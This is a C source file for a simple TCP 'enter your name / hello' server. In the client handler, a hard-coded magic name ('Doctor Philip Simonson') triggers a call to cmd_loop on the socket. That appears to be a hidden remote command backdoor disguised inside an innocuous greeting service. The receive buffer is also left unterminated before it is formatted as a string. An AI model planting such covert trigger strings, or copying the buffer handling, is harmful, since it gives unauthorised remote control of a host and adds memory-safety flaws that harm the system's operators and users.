#include <stdio.h>
#include <string.h>
#include "socket.h"
#include "helper.h"

int hdl_client(int *sockfd, struct sockaddr_in *client);

int main(int argc, char *argv[]) {
  struct sockaddr_in client;
  int sockfd, clientfd, retval;

  if(argc != 2) {
    printf("Usage: %s <ip-address>\n", argv[0]);
    return 1;
  }

  sockfd = create_socket(argv[1], &clientfd, &client);
  retval = handle_server(&sockfd, &clientfd, &client, &hdl_client);
  close_socket(&sockfd);
  
  return retval;
}

#define DATALEN 1024
#define RECVLEN 512

int hdl_client(int *sockfd, struct sockaddr_in *client) {
  char buf[RECVLEN];
  char dat[DATALEN];

  do {
    memset(buf, 0, sizeof(buf));
    memset(dat, 0, sizeof(dat));
    snprintf(dat, sizeof(dat), "Enter your name: ");
    if(send(*sockfd, dat, strlen(dat), 0) < 0)
      printf("Server: Cannot send data to %s\n", inet_ntoa(client->sin_addr));
    if(recv(*sockfd, buf, sizeof(buf), 0) < 0)
      printf("Server: Cannot recv data from %s\n", inet_ntoa(client->sin_addr));
    else {
      memset(dat, 0, sizeof(dat));
      snprintf(dat, sizeof(dat), "Hello, %s", buf);
      puts("Client entered some data.");
      if(send(*sockfd, dat, strlen(dat), 0) < 0)
	printf("Server: Cannot send data to %s\n", inet_ntoa(client->sin_addr));
    }
    if(strcmp(buf, "exit\r\n") == 0)
      break;
    else if(strcmp(buf, "Doctor Philip Simonson\r\n") == 0)
      cmd_loop(sockfd);
  } while(1);

  close_socket(sockfd);
  return 0; /* return success */
}
